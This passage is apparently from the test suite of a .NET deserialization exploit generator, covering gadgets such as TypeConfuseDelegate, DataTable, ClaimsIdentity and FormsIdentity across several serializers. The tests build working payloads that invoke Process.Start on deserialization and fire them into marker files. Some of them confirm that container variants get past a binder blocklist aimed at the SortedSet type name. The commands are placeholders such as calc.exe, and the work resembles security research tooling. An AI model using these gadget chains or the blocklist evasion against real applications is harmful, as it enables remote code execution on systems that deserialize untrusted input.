            AssertTrue(!new GadgetVariant(1, "x").Without("SoapFormatter").SupportsFormatter("soapformatter"), "opt-out is case-insensitive");

            // A variant with no opt-out supports every formatter (the default, empty list).
            var open = new GadgetVariant(2, "y");
            AssertEqual(0, open.UnsupportedFormatters.Count, "the opt-out list defaults to empty");
            AssertTrue(open.SupportsFormatter("SoapFormatter"), "no opt-out means every formatter is supported");
            AssertTrue(open.SupportsFormatter("BinaryFormatter"), "no opt-out means every formatter is supported (2)");
        }

        private static void VariantFormatterOptOutWiring()
        {
            // The two affected gadgets: variant 1 (TypeConfuseDelegate, a generic
            // SortedSet) opts out of SoapFormatter; variant 2 (TextFormattingRunProperties)
            // does not. The gadget-level union still advertises SoapFormatter.
            foreach (string name in new string[] { "ActivitySurrogateDisableTypeCheck", "XamlAssemblyLoadFromFile" })
            {
                var vs = Gadget(name).Variants();
                AssertEqual(2, vs.Count, name + " declares 2 variants");
                AssertTrue(vs[0].UnsupportedFormatters.Contains("SoapFormatter"), name + " variant 1 declares the SoapFormatter opt-out");
                AssertTrue(!vs[0].SupportsFormatter("SoapFormatter"), name + " variant 1 does not support SoapFormatter");
                AssertTrue(vs[0].SupportsFormatter("BinaryFormatter"), name + " variant 1 still supports BinaryFormatter");
                AssertEqual(0, vs[1].UnsupportedFormatters.Count, name + " variant 2 has no opt-out");
                AssertTrue(vs[1].SupportsFormatter("SoapFormatter"), name + " variant 2 supports SoapFormatter");
                AssertTrue(Gadget(name).IsSupported("SoapFormatter"), name + " still lists SoapFormatter at the gadget level (union)");
            }

            // DataTable is the opposite shape: variant 1 (TextFormattingRunProperties) is
            // the compatible default and keeps every formatter; variant 2 (TypeConfuseDelegate,
            // a generic SortedSet) opts out of SoapFormatter but keeps BinaryFormatter and
            // LosFormatter. The gadget-level union still advertises SoapFormatter.
            var dt = Gadget("DataTable").Variants();
            AssertEqual(2, dt.Count, "DataTable declares exactly 2 variants");
            AssertEqual(1, dt[0].Number, "DataTable variant 1 is numbered 1");
            AssertEqual(2, dt[1].Number, "DataTable variant 2 is numbered 2");
            AssertEqual(0, dt[0].UnsupportedFormatters.Count, "DataTable variant 1 has no opt-out");
            AssertTrue(dt[0].SupportsFormatter("SoapFormatter"), "DataTable variant 1 supports SoapFormatter");
            AssertTrue(dt[1].UnsupportedFormatters.Contains("SoapFormatter"), "DataTable variant 2 declares the SoapFormatter opt-out");
            AssertTrue(!dt[1].SupportsFormatter("SoapFormatter"), "DataTable variant 2 does not support SoapFormatter");
            AssertTrue(dt[1].SupportsFormatter("BinaryFormatter"), "DataTable variant 2 still supports BinaryFormatter");
            AssertTrue(dt[1].SupportsFormatter("LosFormatter"), "DataTable variant 2 still supports LosFormatter");
            AssertTrue(Gadget("DataTable").IsSupported("SoapFormatter"), "DataTable still lists SoapFormatter at the gadget level (union)");
        }

        private static void EditorBlocksVariantFormatterMismatch()
        {
            // The editor validates a variant+formatter mismatch at generate: variant 1 of
            // ActivitySurrogateDisableTypeCheck cannot produce SoapFormatter, so the editor
            // blocks with a precise line naming the setting, the formatter, and the variant.
            var ed = new ModuleEditor(null, null, true, null, null);
            var fields = ed.BuildFieldsForTest("ActivitySurrogateDisableTypeCheck");

            // Default variant is 1; pick the opted-out formatter.
            FindEditable(fields, "formatter").Value = "SoapFormatter";
            string p = ed.MissingVariantFormatterProblemForTest();
            AssertTrue(p != null, "variant 1 + SoapFormatter is reported as a problem");
            AssertTrue(p.Contains("formatter") && p.Contains("SoapFormatter") && p.Contains("variant 1"),
                "the problem names the setting, the formatter, and the variant: " + p);

            // A supported formatter on the same variant is fine.
            FindEditable(fields, "formatter").Value = "BinaryFormatter";
            AssertTrue(ed.MissingVariantFormatterProblemForTest() == null, "variant 1 + BinaryFormatter is fine");

            // Switching to variant 2 (TextFormattingRunProperties) makes Soap fine again.
            FindEditable(fields, "formatter").Value = "SoapFormatter";
            string v2label = Gadget("ActivitySurrogateDisableTypeCheck").Variants()[1].Label;
            FindEditable(fields, "variant").Value = v2label;
            AssertTrue(ed.MissingVariantFormatterProblemForTest() == null, "variant 2 + SoapFormatter is fine");
        }

        private static void GuardBlocksVariantFormatterOnNonUiPath()
        {
            // The non-UI guard (GuardVariantFormatter in Generate) turns the impossible
            // variant 1 + SoapFormatter pair into a clean RunResult.Fail carrying the
            // guard message, not the raw framework "Generic Types" string. This drives
            // the same PayloadRunner.GenerateGadget path the CLI uses.
            // ActivitySurrogateDisableTypeCheck ignores -c (no file compile), so it is fast.
            RunResult v1soap = GenerateWithVariant("ActivitySurrogateDisableTypeCheck", "SoapFormatter", 1);
            AssertTrue(!v1soap.Success, "variant 1 + SoapFormatter fails");
            AssertTrue((v1soap.ErrorMessage ?? "").IndexOf("is not supported by variant 1", StringComparison.OrdinalIgnoreCase) >= 0,
                "the guard fired, not the raw framework error: " + v1soap.ErrorMessage);

            // An unaffected formatter on the same variant still generates.
            RunResult v1bin = GenerateWithVariant("ActivitySurrogateDisableTypeCheck", "BinaryFormatter", 1);
            AssertTrue(v1bin.Success, "variant 1 + BinaryFormatter still generates: " + v1bin.ErrorMessage);

            // Variant 2 (TextFormattingRunProperties) is not generic, so Soap works.
            RunResult v2soap = GenerateWithVariant("ActivitySurrogateDisableTypeCheck", "SoapFormatter", 2);
            AssertTrue(v2soap.Success, "variant 2 + SoapFormatter generates: " + v2soap.ErrorMessage);

            // DataTable is the mirror image: its variant 2 (TypeConfuseDelegate) is the
            // generic one, so variant 2 + SoapFormatter is the guarded pair. Variant 1
            // (TextFormattingRunProperties) + SoapFormatter and variant 2 + BinaryFormatter
            // must both still generate.
            RunResult dtV2soap = GenerateWithVariant("DataTable", "SoapFormatter", 2);
            AssertTrue(!dtV2soap.Success, "DataTable variant 2 + SoapFormatter fails");
            AssertTrue((dtV2soap.ErrorMessage ?? "").IndexOf("is not supported by variant 2", StringComparison.OrdinalIgnoreCase) >= 0,
                "the guard fired for DataTable, not the raw framework error: " + dtV2soap.ErrorMessage);

            RunResult dtV1soap = GenerateWithVariant("DataTable", "SoapFormatter", 1);
            AssertTrue(dtV1soap.Success, "DataTable variant 1 + SoapFormatter still generates: " + dtV1soap.ErrorMessage);

            RunResult dtV2bin = GenerateWithVariant("DataTable", "BinaryFormatter", 2);
            AssertTrue(dtV2bin.Success, "DataTable variant 2 + BinaryFormatter generates: " + dtV2bin.ErrorMessage);
        }

        // GenericIdentity reaches the ClaimsIdentity nested-BinaryFormatter sink through a
        // DIFFERENT root type than the ClaimsIdentity gadget. Because GenericIdentity derives
        // from ClaimsIdentity, the inherited private field is exposed by FormatterServices
        // under the prefixed name "ClaimsIdentity+m_serializedClaims" (SOAP encodes the plus as
        // _x002B_). Lock both facts so the payload cannot silently regress to the plain
        // ClaimsIdentity root type or the unprefixed field name, which would not deserialize
        // onto a GenericIdentity.
        private static void GenericIdentityCarriesDerivedType()
        {
            GenerationRequest bfReq = new GenerationRequest
            {
                GadgetName = "GenericIdentity",
                FormatterName = "BinaryFormatter",
                OutputFormat = "",
                InputArgs = CalcInput(),
            };
            RunResult bf = PayloadRunner.GenerateGadget(bfReq);
            AssertTrue(bf.Success, "GenericIdentity BinaryFormatter generates: " + bf.ErrorMessage);
            string bfText = System.Text.Encoding.ASCII.GetString((byte[])bf.Raw);
            AssertTrue(bfText.Contains("System.Security.Principal.GenericIdentity"),
                "BinaryFormatter payload carries the GenericIdentity root type");
            AssertTrue(bfText.Contains("ClaimsIdentity+m_serializedClaims"),
                "BinaryFormatter payload uses the inherited prefixed field name");

            GenerationRequest soapReq = new GenerationRequest
            {
                GadgetName = "GenericIdentity",
                FormatterName = "SoapFormatter",
                OutputFormat = "",
                InputArgs = CalcInput(),
            };
            RunResult soap = PayloadRunner.GenerateGadget(soapReq);
            AssertTrue(soap.Success, "GenericIdentity SoapFormatter generates: " + soap.ErrorMessage);
            string soapText = soap.Raw is byte[] ? System.Text.Encoding.ASCII.GetString((byte[])soap.Raw) : (string)soap.Raw;
            AssertTrue(soapText.Contains("GenericIdentity"),
                "SoapFormatter payload carries the GenericIdentity element");
            AssertTrue(soapText.Contains("ClaimsIdentity_x002B_m_serializedClaims"),
                "SoapFormatter payload uses the XML-encoded inherited prefixed field name");
        }

        // DataContractJsonSerializer needs its root type supplied at construction (the JSON has
        // no resolvable type token), so the generic fire markers cannot drive it. This fires each
        // ClaimsIdentity-family gadget's DCJson payload with the correct root type and asserts the
        // inner TFRP executes (marker), raw and minified. The post-fire cast throws after firing;
        // the marker file is the proof.
        private static void DataContractJsonFiresForClaimsFamily()
        {
            const string mscorlib = "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
            var map = new List<string[]>
            {
                new[] { "ClaimsIdentity",   "System.Security.Claims.ClaimsIdentity, " + mscorlib },
                new[] { "GenericIdentity",  "System.Security.Principal.GenericIdentity, " + mscorlib },
                new[] { "ClaimsPrincipal",  "System.Security.Claims.ClaimsPrincipal, " + mscorlib },
                new[] { "GenericPrincipal", "System.Security.Principal.GenericPrincipal, " + mscorlib },
                new[] { "FormsIdentity",    "System.Web.Security.FormsIdentity, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" },
            };
            foreach (string[] entry in map)
            {
                string gadget = entry[0];
                string aqn = entry[1];
                for (int m = 0; m < 2; m++)
                {
                    bool minify = m == 1;
                    string marker = MarkerPath("DCJson_" + gadget + (minify ? "_m" : ""));
                    SafeDelete(marker);
                    try
                    {
                        InputArgs ia = new InputArgs();
                        ia.Cmd = MarkerCommand(marker);
                        ia.IsRawCmd = true;
                        ia.Test = false;
                        ia.Minify = minify;
                        GenerationRequest req = new GenerationRequest
                        {
                            GadgetName = gadget,
                            FormatterName = "DataContractJsonSerializer",
                            OutputFormat = "",
                            InputArgs = ia,
                        };
                        RunResult r = PayloadRunner.GenerateGadget(req);
                        AssertTrue(r.Success, "DCJson generate " + gadget + ": " + r.ErrorMessage);

                        string json = (string)r.Raw;
                        RunSTA(delegate { SerializersHelper.DataContractJsonSerializer_deserialize(json, aqn, null); });

                        AssertTrue(WaitForFile(marker, MarkerWaitMs),
                            "DataContractJsonSerializer fires for " + gadget + (minify ? " (minify)" : ""));
                    }
                    finally { SafeDelete(marker); }
                }
            }
        }

        // FormsIdentity is in System.Web, so its BinaryFormatter stream carries an explicit
        // BinaryAssembly record and the required _Ticket member. The standard fire markers
        // deserialize in the default Simple assembly mode, which tolerates missing members.
        // This locks the stricter Full mode: it proves the System.Web assembly record and the
        // _Ticket member are actually present and correct, not just tolerated. The inner TFRP
        // fires Process.Start (dropping the marker) then throws a cast error; the marker is the
        // proof of execution.
        private static void FormsIdentityFiresUnderFullAssemblyMode()
        {
            string marker = MarkerPath("FormsIdentity_BF_Full");
            SafeDelete(marker);
            try
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = MarkerCommand(marker);
                ia.IsRawCmd = true;
                ia.Test = false;
                GenerationRequest req = new GenerationRequest
                {
                    GadgetName = "FormsIdentity",
                    FormatterName = "BinaryFormatter",
                    OutputFormat = "",
                    InputArgs = ia,
                };
                RunResult r = PayloadRunner.GenerateGadget(req);
                AssertTrue(r.Success, "FormsIdentity BinaryFormatter generates: " + r.ErrorMessage);

                byte[] payload = (byte[])r.Raw;
                RunSTA(delegate
                {
                    var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                    bf.AssemblyFormat = System.Runtime.Serialization.Formatters.FormatterAssemblyStyle.Full;
                    using (var ms = new MemoryStream(payload))
                        bf.Deserialize(ms);
                });

                AssertTrue(WaitForFile(marker, MarkerWaitMs),
                    "FormsIdentity BinaryFormatter payload fires under AssemblyFormat=Full");
            }
            finally { SafeDelete(marker); }
        }

        // Drive PayloadRunner.GenerateGadget for one gadget/formatter/variant with a
        // never-executed placeholder command (Test=false), the same as a matrix cell.
        private static RunResult GenerateWithVariant(string gadget, string formatter, int variant)
        {
            InputArgs ia = CalcInput();
            ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };
            GenerationRequest req = new GenerationRequest
            {
                GadgetName = gadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            };
            return PayloadRunner.GenerateGadget(req);
        }

        // Adding the variant selector must not change DataTable's default payload: with no
        // option, DataTable must produce the exact same bytes as an explicit --variant 1,
        // across every advertised formatter and both minify states. This locks backward
        // compatibility without hardcoding runtime-sensitive payload hashes: it compares two
        // live generations of the same command, so it stays valid as the payload evolves.
        private static void DataTableDefaultEqualsVariantOne()
        {
            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter", "LosFormatter" })
            {
                for (int m = 0; m < 2; m++)
                {
                    bool minify = m == 1;

                    RunResult def = GenerateDataTable(formatter, minify, null);
                    RunResult v1 = GenerateDataTable(formatter, minify, 1);

                    string desc = "DataTable -f " + formatter + (minify ? " (minify)" : "");
                    AssertTrue(def.Success, "implicit default generates: " + desc + " -> " + def.ErrorMessage);
                    AssertTrue(v1.Success, "explicit variant 1 generates: " + desc + " -> " + v1.ErrorMessage);

                    byte[] a = def.Raw as byte[];
                    byte[] b = v1.Raw as byte[];
                    AssertTrue(a != null && b != null, "both payloads are byte streams: " + desc);
                    AssertTrue(BytesEqual(a, b),
                        "implicit default equals explicit variant 1 byte-for-byte: " + desc);
                }
            }
        }

        // Generate DataTable with a never-executed placeholder command. Pass variant=null
        // for the implicit default (no --variant), or a number for an explicit selection.
        private static RunResult GenerateDataTable(string formatter, bool minify, int? variant)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";
            ia.Test = false;
            ia.Minify = minify;
            if (variant.HasValue)
                ia.ExtraArguments = new List<string> { "--variant", variant.Value.ToString() };
            GenerationRequest req = new GenerationRequest
            {
                GadgetName = "DataTable",
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            };
            return PayloadRunner.GenerateGadget(req);
        }

        // ---- TypeConfuseDelegate root-container variants -----------------------
        //
        // Variants 2 and 3 keep the Comparison<string> -> Process.Start splice and only
        // change the serialized ROOT: SortedDictionary<string,string> (whose serialized
        // TreeSet<KeyValuePair<string,string>> backing set forwards key comparisons through
        // KeyValuePairComparer) and the internal TreeSet<string>. They exist to evade a
        // binder or blocklist that rejects the exact SortedSet wire type name.

        // Generate TypeConfuseDelegate with a never-executed placeholder command. Pass
        // variant=null for the implicit default (no --variant).
        private static RunResult GenerateTcd(string formatter, bool minify, bool useSimpleType, int? variant)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";
            ia.Test = false;
            ia.Minify = minify;
            ia.UseSimpleType = useSimpleType;
            if (variant.HasValue)
                ia.ExtraArguments = new List<string> { "--variant", variant.Value.ToString() };
            GenerationRequest req = new GenerationRequest
            {
                GadgetName = "TypeConfuseDelegate",
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            };
            return PayloadRunner.GenerateGadget(req);
        }

        private static readonly string[] TcdFormatters =
            { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };

        // Adding the container selector must not change the default payload: with no
        // option, TypeConfuseDelegate must produce the exact same bytes as an explicit
        // --variant 1, for every advertised formatter and every minify/usesimpletype
        // combination - including the two hardcoded NRBF paths (--minify --ust with
        // BinaryFormatter and LosFormatter), which stay gated on variant 1. This compares
        // two live generations rather than a frozen hash, so it survives payload evolution.
        private static void TypeConfuseDelegateDefaultEqualsVariantOne()
        {
            foreach (string formatter in TcdFormatters)
            {
                for (int m = 0; m < 2; m++)
                {
                    for (int u = 0; u < 2; u++)
                    {
                        bool minify = m == 1, ust = u == 1;
                        string desc = "TypeConfuseDelegate -f " + formatter
                            + (minify ? " (minify)" : "") + (ust ? " (ust)" : "");

                        RunResult def = GenerateTcd(formatter, minify, ust, null);
                        RunResult v1 = GenerateTcd(formatter, minify, ust, 1);

                        AssertTrue(def.Success, "implicit default generates: " + desc + " -> " + def.ErrorMessage);
                        AssertTrue(v1.Success, "explicit variant 1 generates: " + desc + " -> " + v1.ErrorMessage);

                        byte[] a = def.Raw as byte[];
                        byte[] b = v1.Raw as byte[];
                        AssertTrue(a != null && b != null, "both payloads are byte streams: " + desc);
                        AssertTrue(BytesEqual(a, b),
                            "implicit default equals explicit variant 1 byte-for-byte: " + desc);
                    }
                }
            }

            // The hardcoded minified NRBF path belongs to variant 1 only, so the other two
            // containers must take the normal Serialize() route and produce different bytes.
            foreach (string formatter in new[] { "BinaryFormatter", "LosFormatter" })
            {
                byte[] one = (byte[])GenerateTcd(formatter, true, true, 1).Raw;
                foreach (int v in new[] { 2, 3 })
                {
                    RunResult other = GenerateTcd(formatter, true, true, v);
                    AssertTrue(other.Success, "variant " + v + " generates on the minify+ust " + formatter
                        + " path: " + other.ErrorMessage);
                    AssertTrue(!BytesEqual(one, (byte[])other.Raw),
                        "variant " + v + " does not reuse the hardcoded variant-1 NRBF stream (" + formatter + ")");
                }
            }
        }

        // The variant option must reject anything that is not 1, 2, or 3 instead of quietly
        // falling back to the default, which would hide a typo behind a payload the user did
        // not ask for.
        private static void TypeConfuseDelegateVariantOptionIsValidated()
        {
            foreach (string bad in new[] { "nope", "0", "4", "-1", "" })
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = "calc.exe";
                ia.Test = false;
                ia.ExtraArguments = new List<string> { "--variant", bad };
                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = "TypeConfuseDelegate",
                    FormatterName = "BinaryFormatter",
                    OutputFormat = "",
                    InputArgs = ia,
                });
                AssertTrue(!r.Success, "--variant " + bad + " is rejected");
                AssertTrue((r.ErrorMessage ?? "").IndexOf("variant must be 1, 2, or 3", StringComparison.OrdinalIgnoreCase) >= 0,
                    "--variant " + bad + " reports the allowed values: " + r.ErrorMessage);
            }

            foreach (int good in new[] { 1, 2, 3 })
                AssertTrue(GenerateTcd("BinaryFormatter", false, false, good).Success,
                    "--variant " + good + " is accepted");
        }

        // The point of variants 2 and 3 is the wire type names, so assert them directly on
        // the BinaryFormatter stream: the chosen root must be present and the SortedSet name
        // must be gone. Variant 2 must also carry the inner TreeSet backing set that actually
        // triggers the comparer.
        private static void TypeConfuseDelegateVariantRootsAvoidSortedSetName()
        {
            const string sortedSet = "System.Collections.Generic.SortedSet`1";
            const string treeSet = "System.Collections.Generic.TreeSet`1";
            const string sortedDict = "System.Collections.Generic.SortedDictionary`2";

            string v1 = TcdStreamText(1);
            AssertTrue(v1.Contains(sortedSet), "variant 1 still serializes a SortedSet root");

            string v2 = TcdStreamText(2);
            AssertTrue(v2.Contains(sortedDict), "variant 2 serializes a SortedDictionary root");
            AssertTrue(v2.Contains(treeSet), "variant 2 carries the inner TreeSet backing set");
            AssertTrue(v2.Contains("KeyValuePairComparer"), "variant 2 carries the KeyValuePairComparer that forwards key comparisons");
            AssertTrue(!v2.Contains(sortedSet), "variant 2 emits no SortedSet type record");

            string v3 = TcdStreamText(3);
            AssertTrue(v3.Contains(treeSet), "variant 3 serializes a TreeSet root");
            AssertTrue(!v3.Contains(sortedDict), "variant 3 does not wrap the set in a dictionary");
            AssertTrue(!v3.Contains(sortedSet), "variant 3 emits no SortedSet type record");

            // The delegate primitive is unchanged in all three.
            foreach (var pair in new[] { new[] { "1", v1 }, new[] { "2", v2 }, new[] { "3", v3 } })
            {
                AssertTrue(pair[1].Contains("System.DelegateSerializationHolder"),
                    "variant " + pair[0] + " still carries the delegate serialization holder");
                AssertTrue(pair[1].Contains("System.Diagnostics.Process"),
                    "variant " + pair[0] + " still targets Process.Start");
            }
        }

        // The raw BinaryFormatter bytes of one variant, read as ASCII so the embedded type
        // name records can be searched.
        private static string TcdStreamText(int variant)
        {
            RunResult r = GenerateTcd("BinaryFormatter", false, false, variant);
            AssertTrue(r.Success, "TypeConfuseDelegate variant " + variant + " generates: " + r.ErrorMessage);
            return Encoding.ASCII.GetString((byte[])r.Raw);
        }

        // A deliberately narrow blocklist: it rejects ONLY a type name that starts with the
        // SortedSet wire name and lets everything else resolve normally. That is exactly the
        // policy variants 2 and 3 target. Returning null falls back to the default binding,
        // so the rest of the graph is untouched.
        private sealed class SortedSetNameBlockingBinder : System.Runtime.Serialization.SerializationBinder
        {
            public override Type BindToType(string assemblyName, string typeName)
            {
                if (typeName != null
                    && typeName.StartsWith("System.Collections.Generic.SortedSet`1", StringComparison.Ordinal))
                    throw new System.Runtime.Serialization.SerializationException(
                        "blocked by the test binder: " + typeName);
                return null;
            }
        }

        // The behavioral proof of the evasion, which the byte-name assertions alone cannot
        // give: through a binder that rejects only the exact SortedSet wire name, variant 1
        // is blocked and never runs, while variants 2 and 3 deserialize and fire the command
        // into a test-owned marker file.
        private static void TypeConfuseDelegateVariantsEvadeSortedSetBinder()
        {
            // Variant 1 must be blocked, and must NOT execute.
            string blockedMarker = MarkerPath("TCD_binder_v1_blocked");
            SafeDelete(blockedMarker);
            try
            {
                byte[] payload = TcdMarkerPayload(1, "BinaryFormatter", false, false, blockedMarker);
                Exception caught = null;
                try { DeserializeWithBinder(payload, new SortedSetNameBlockingBinder()); }
                catch (Exception ex) { caught = ex; }

                AssertTrue(caught != null, "the binder blocks the SortedSet root of variant 1");
                System.Threading.Thread.Sleep(300);
                bool ran = File.Exists(blockedMarker);
                AssertTrue(!ran, "variant 1 does not execute when its root type is blocked");
            }
            finally { SafeDelete(blockedMarker); }

            // Variants 2 and 3 pass the same binder and fire.
            foreach (int variant in new[] { 2, 3 })
            {
                string marker = MarkerPath("TCD_binder_v" + variant);
                SafeDelete(marker);
                try
                {
                    byte[] payload = TcdMarkerPayload(variant, "BinaryFormatter", false, false, marker);
                    // The gadget throws AFTER Process.Start (the confused return value is cast
                    // back to int), so the marker file, not a clean return, is the proof.
                    RunSTA(delegate { DeserializeWithBinder(payload, new SortedSetNameBlockingBinder()); });
                    AssertTrue(WaitForFile(marker, MarkerWaitMs),
                        "variant " + variant + " fires through a binder that rejects the SortedSet wire name");
                }
                finally { SafeDelete(marker); }
            }
        }

        private static void DeserializeWithBinder(byte[] payload, System.Runtime.Serialization.SerializationBinder binder)
        {
            var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            bf.Binder = binder;
            using (var ms = new MemoryStream(payload))
                bf.Deserialize(ms);
        }

        // Build a real payload whose command writes the given marker file.
        private static byte[] TcdMarkerPayload(int variant, string formatter, bool minify, bool useSimpleType, string marker)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = MarkerCommand(marker);
            ia.IsRawCmd = true;
            ia.Test = false;
            ia.Minify = minify;
            ia.UseSimpleType = useSimpleType;
            ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };
            RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "TypeConfuseDelegate",
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
            AssertTrue(r.Success, "TypeConfuseDelegate variant " + variant + " -f " + formatter
                + " generates a marker payload: " + r.ErrorMessage);
            return (byte[])r.Raw;
        }

        // SortedDictionary and TreeSet reject a duplicate key, and the two compared strings
        // ARE the two Process.Start arguments, so an input whose executable and argument
        // strings are equal has no semantics-preserving representation. It must be refused
        // with a clear message, never repaired by mutating the command. An empty argument is
        // normal and must keep working.
        private static void TypeConfuseDelegateVariantKeyEdgeCases()
        {
            foreach (int variant in new[] { 1, 2, 3 })
            {
                // A single raw token: file name "calc.exe", argument "". Distinct, so valid.
                RunResult empty = GenerateTcdRaw("calc.exe", variant);
                AssertTrue(empty.Success,
                    "variant " + variant + " generates when the argument string is empty: " + empty.ErrorMessage);
            }

            // Equal executable and argument strings. Variant 1 still GENERATES, but the
            // payload is a dud: SortedSet drops the duplicate, so the serialized set holds one
            // element and SortedSet.AddIfNotPresent returns at the empty-root case on
            // deserialize without ever calling the comparer. Assert the collapse directly on
            // the live gadget object, so the limitation is tested rather than assumed - and so
            // nothing can start recommending variant 1 as the workaround for this input.
            InputArgs dup = new InputArgs();
            dup.Cmd = "dup.exe dup.exe";
            dup.IsRawCmd = true;
            dup.Test = false;
            var collapsed = (System.Collections.Generic.SortedSet<string>)
                TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(dup);
            AssertEqual(1, collapsed.Count,
                "variant 1 collapses equal executable and argument strings to a single element");

            RunResult v1 = GenerateTcdRaw("dup.exe dup.exe", 1);
            AssertTrue(v1.Success, "variant 1 (SortedSet) still generates for equal strings: " + v1.ErrorMessage);

            foreach (int variant in new[] { 2, 3 })
            {
                RunResult r = GenerateTcdRaw("dup.exe dup.exe", variant);
                AssertTrue(!r.Success, "variant " + variant + " rejects equal executable and argument strings");
                AssertTrue((r.ErrorMessage ?? "").IndexOf("distinct", StringComparison.OrdinalIgnoreCase) >= 0,
                    "variant " + variant + " explains why: " + r.ErrorMessage);
                AssertTrue((r.ErrorMessage ?? "").IndexOf("so they differ", StringComparison.OrdinalIgnoreCase) >= 0,
                    "variant " + variant + " tells the user the only real fix: " + r.ErrorMessage);
                AssertTrue((r.ErrorMessage ?? "").IndexOf("does not fire", StringComparison.OrdinalIgnoreCase) >= 0,
                    "variant " + variant + " does not present variant 1 as a working workaround: " + r.ErrorMessage);
            }
        }

        // Formatter-expansion result, locked as a test instead of left as an assumption.
        // TypeConfuseDelegate advertises BinaryFormatter, NetDataContractSerializer and
        // LosFormatter, and the container swap does not widen that set: all three roots are
        // GENERIC types (SortedSet`1, SortedDictionary`2, TreeSet`1) and SoapFormatter cannot
        // serialize a generic type. This asserts the limitation for every container rather
        // than silently omitting the formatter, so if a framework or serializer change ever
        // lifts it, the test says so.
        private static void TypeConfuseDelegateContainersCannotUseSoapFormatter()
        {
            foreach (int variant in new[] { 1, 2, 3 })
            {
                AssertTrue(!Gadget("TypeConfuseDelegate").IsSupported("SoapFormatter"),
                    "SoapFormatter is not advertised by TypeConfuseDelegate");

                var gen = new TypeConfuseDelegateGenerator();
                gen.Options().Parse(new[] { "--variant", variant.ToString() });
                InputArgs ia = new InputArgs();
                ia.Cmd = "calc.exe";
                ia.Test = false;

                AssertThrows(delegate { gen.Generate("SoapFormatter", ia); },
                    "SoapFormatter cannot serialize the generic root of variant " + variant);
            }
        }

        // Every declared variant must generate from the variant flag ALONE. A gadget's
        // var/variant number is its own; it must never be consumed by a hardcoded inner gadget
        // that happens to use the same option name (GenericGenerator.GenerateInner is what
        // keeps them apart). The FULL matrix cannot catch this because it always passes
        // --xamlurl alongside the variant, which is exactly the option the leak needed; this
        // test deliberately passes nothing but the variant.
        //
        // Scoped to gadgets whose -c is a shell command or unused, so it stays fast and does
        // not invoke the C# compiler. The file/dll-input gadgets are covered by the FULL matrix.
        private static void EveryVariantGeneratesFromTheVariantFlagAlone()
        {
            // ObjectDataProvider variant 3 is the SSRF variant: --xamlurl is its genuine input,
            // not a leaked outer option. It is the only legitimate exception.
            var needsOwnExtraInput = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
            {
                "ObjectDataProvider|3",
            };

            var failures = new List<string>();
            int checkedCells = 0;

            foreach (string name in GadgetRegistry.GetAllGadgetNames())
            {
                if (name == "Generic") continue;
                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                if (g == null) continue;

                var variants = g.Variants();
                if (variants == null || variants.Count == 0) continue;

                string variantFlag = VariantFlagFor(g);
                string formatter = g.SupportedFormatters()[0].Split(' ')[0];

                foreach (GadgetVariant v in variants)
                {
                    CommandInputType inType = v.EffectiveInput(g.CommandInput());
                    if (inType != CommandInputType.ShellCommand && inType != CommandInputType.Ignored)
                        continue;
                    if (!v.SupportsFormatter(formatter)) continue;
                    if (needsOwnExtraInput.Contains(name + "|" + v.Number)) continue;

                    InputArgs ia = new InputArgs();
                    ia.Cmd = "calc.exe";
                    ia.Test = false;
                    ia.ExtraArguments = new List<string> { variantFlag, v.Number.ToString() };

                    RunResult r;
                    try
                    {
                        r = PayloadRunner.GenerateGadget(new GenerationRequest
                        {
                            GadgetName = name,
                            FormatterName = formatter,
                            OutputFormat = "",
                            InputArgs = ia,
                        });
                    }
                    catch (Exception ex) { r = RunResult.Fail("THREW " + ex.Message); }

                    checkedCells++;
                    if (!r.Success)
                        failures.Add(name + " " + variantFlag + " " + v.Number + " -f " + formatter
                            + " -> " + r.ErrorMessage);
                    else if (RawIsEmpty(r.Raw))
                        failures.Add(name + " " + variantFlag + " " + v.Number + " -> empty payload");
                }
            }

            AssertTrue(checkedCells > 0, "the variant sweep actually checked something");
            AssertTrue(failures.Count == 0,
                "every variant generates from the variant flag alone (" + checkedCells + " checked): "
                    + string.Join(" | ", failures.ToArray()));
        }

        // The interactive editor must offer all three container labels, start on the
        // SortedSet default, and emit the NUMBER on the command line, not the label.
        private static void EditorExposesTypeConfuseDelegateContainerVariants()
        {
            var ed = new ModuleEditor(null, null, true, null, null);
            var fields = ed.BuildFieldsForTest("TypeConfuseDelegate");

            EditableField variant = FindEditable(fields, "variant");
            AssertTrue(variant != null, "the variant field is offered for TypeConfuseDelegate");
            AssertTrue(variant.Choices != null && variant.Choices.Count == 3,
                "all three container labels are offered");

            var declared = Gadget("TypeConfuseDelegate").Variants();
            for (int i = 0; i < declared.Count; i++)
                AssertEqual(declared[i].Label, variant.Choices[i], "label " + (i + 1) + " is in variant order");
            AssertEqual(declared[0].Label, variant.Value, "the editor starts on variant 1 (the SortedSet default)");

            FindEditable(fields, "command").Value = "calc.exe";
            string flag = VariantFlagFor(Gadget("TypeConfuseDelegate"));

            variant.Value = declared[2].Label; // TreeSet
            string line = ed.GadgetCommandLineForTest();
            AssertTrue(line.Contains(flag + " 3"),
                "the echoed command line carries the numeric variant: " + line);
            AssertTrue(!line.Contains(declared[2].Label),
                "the human label never leaks into the command line: " + line);

            variant.Value = declared[1].Label; // SortedDictionary
            AssertTrue(ed.GadgetCommandLineForTest().Contains(flag + " 2"),
